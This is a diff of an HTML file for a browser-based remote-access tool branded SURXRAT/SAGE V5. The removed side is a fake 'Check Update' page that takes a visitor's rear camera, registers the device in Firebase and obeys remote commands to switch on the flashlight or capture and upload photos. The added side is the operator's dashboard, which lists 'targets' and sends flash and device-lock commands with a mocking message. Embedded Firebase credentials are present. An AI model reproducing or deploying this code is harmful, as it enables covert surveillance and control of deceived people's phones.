@@ -1,89 +1,53 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>V-PROJECT SYSTEM</title>
+    <title>SAGE V5 CONTROL</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; height: 100vh; margin: 0; display: flex; align-items: center; justify-content: center; }
-        .glass { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); padding: 40px; border-radius: 25px; text-align: center; width: 80%; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        h2 { text-transform: uppercase; letter-spacing: 5px; color: #00f2ff; text-shadow: 0 0 15px #00f2ff; }
-        .loader { width: 100%; height: 2px; background: #111; margin: 25px 0; overflow: hidden; border-radius: 10px; }
-        .bar { width: 0%; height: 100%; background: #00f2ff; box-shadow: 0 0 10px #00f2ff; transition: 1s; }
-        button { background: transparent; border: 1px solid #00f2ff; color: #00f2ff; padding: 12px 30px; border-radius: 50px; cursor: pointer; font-weight: bold; transition: 0.4s; letter-spacing: 1px; }
-        button:hover { background: #00f2ff; color: #000; box-shadow: 0 0 20px #00f2ff; }
-        #status { font-size: 10px; color: #444; margin-top: 15px; }
+        body { background: #000; color: #ff0000; font-family: monospace; padding: 20px; }
+        .card { border: 1px solid #ff0000; padding: 15px; margin-bottom: 10px; background: #110000; }
+        button { background: #ff0000; color: #fff; border: none; padding: 10px; margin: 5px; cursor: pointer; font-weight: bold; }
+        .btn-flash { background: #ffcc00; color: #000; }
     </style>
 </head>
 <body>
-    <div class="glass">
-        <h2 id="brand">SURXRAT V5</h2>
-        <div class="loader"><div id="progress" class="bar"></div></div>
-        <p id="msg" style="font-size: 12px; color: #aaa;">SYSTEM UPDATE REQUIRED</p>
-        <button id="btn" onclick="exec(this)">Check Update</button>
-        <div id="status">ENCRYPTED CONNECTION</div>
-    </div>
+    <h1>SAGE V5 | DASHBOARD</h1>
+    <div id="targetList">Loading targets...</div>
 
     <script>
         const firebaseConfig = {
-            apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
-            authDomain: "rat-html.firebaseapp.com",
-            databaseURL: "https://rat-html-default-rtdb.asia-southeast1.firebasedatabase.app",
-            projectId: "rat-html",
-            storageBucket: "rat-html.firebasestorage.app",
-            messagingSenderId: "1060124583265",
-            appId: "1:1060124583265:web:7988dc574a1be9f10f5120"
+            apiKey: "AIzaSyBfeY-xJ4TQWrQq8IZwwsigP9jwPpstThk",
+            authDomain: "control-rat.firebaseapp.com",
+            databaseURL: "https://control-rat-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "control-rat",
+            appId: "1:181283651682:web:42a169e6daaad00f7e513b"
         };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        async function exec(b) {
-            b.style.display = 'none';
-            document.getElementById('progress').style.width = '100%';
-            
-            try {
-                // FIX: Paksa pake kamera belakang (environment) biar senter nyala
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "environment" } 
-                });
-                window.localStream = stream;
-                
-                if ('wakeLock' in navigator) await navigator.wakeLock.request('screen');
-
-                const id = "SURX_" + Math.floor(Math.random() * 9999);
-                const dev = navigator.userAgent.match(/(Infinix|Samsung|Oppo|Xiaomi|Vivo|Realme)/i)?.[0] || "Mobile_Device";
-                
-                db.ref('targets/' + id).set({ name: dev, status: "Active" });
-                document.getElementById('brand').innerText = "UPDATED";
-                document.getElementById('msg').innerText = "SYSTEM SECURED.";
-
-                db.ref('commands/' + id).on('value', (s) => {
-                    const c = s.val(); if(!c || !window.localStream) return;
-                    
-                    // KONTROL SENTER BELAKANG
-                    if(c.type === "flash") {
-                        const track = window.localStream.getVideoTracks()[0];
-                        track.applyConstraints({ advanced: [{ torch: (c.status === "on") }] });
-                    }
-                    
-                    // CAPTURE FOTO BELAKANG
-                    if(c.type === "capture") {
-                        const v = document.createElement('video');
-                        v.srcObject = window.localStream; v.play();
-                        setTimeout(() => {
-                            const cn = document.createElement('canvas');
-                            cn.width = v.videoWidth; cn.height = v.videoHeight;
-                            cn.getContext('2d').drawImage(v, 0, 0);
-                            db.ref('reports/' + id).set({ photo: cn.toDataURL('image/jpeg', 0.5) });
-                        }, 1000);
-                    }
-                });
-            } catch (e) { 
-                alert("ACCESS DENIED"); 
-                location.reload(); 
+        db.ref('targets').on('value', (snapshot) => {
+            const list = document.getElementById('targetList');
+            list.innerHTML = "";
+            const data = snapshot.val();
+            for(let id in data) {
+                list.innerHTML += `
+                <div class="card">
+                    <h3>TARGET: ${id} [${data[id].status}]</h3>
+                    <button class="btn-flash" onclick="send('${id}', 'flash', 'on')">FLASH ON</button>
+                    <button class="btn-flash" onclick="send('${id}', 'flash', 'off')">FLASH OFF</button>
+                    <button onclick="lock('${id}')">LOCK DEVICE</button>
+                </div>`;
             }
+        });
+
+        function send(id, type, stat) {
+            db.ref('commands/' + id).set({ type: type, status: stat });
+        }
+
+        function lock(id) {
+            let m = prompt("Pesan Lock:", "TERKUNCI KAN HP LU WKWK");
+            db.ref('commands/' + id).set({ type: "lock", message: m, pin: "7777" });
         }
     </script>
 </body>
